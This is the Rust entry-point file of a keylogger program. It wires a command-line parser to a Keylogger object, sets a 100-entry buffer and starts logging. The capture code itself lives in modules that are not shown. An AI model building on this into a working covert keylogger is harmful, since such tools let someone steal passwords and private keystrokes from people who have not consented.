mod cli_parser;
mod keylogger;
mod method;
use keylogger::Keylogger;

use std::process::exit;

const BUFFER_CAPACITY: usize = 100;

fn wrapper() -> Result<(), String> {
    let method = cli_parser::get_method()?;
    let mut keylogger = Keylogger::new(method)
        .set_buffer_capacity(BUFFER_CAPACITY);
    keylogger.start();
    Ok(())
}

fn main() {
    match wrapper() {
        Ok(_) => (),
        Err(msg) => {
            eprintln!("{}", msg);
            exit(1);
        }
    }
}
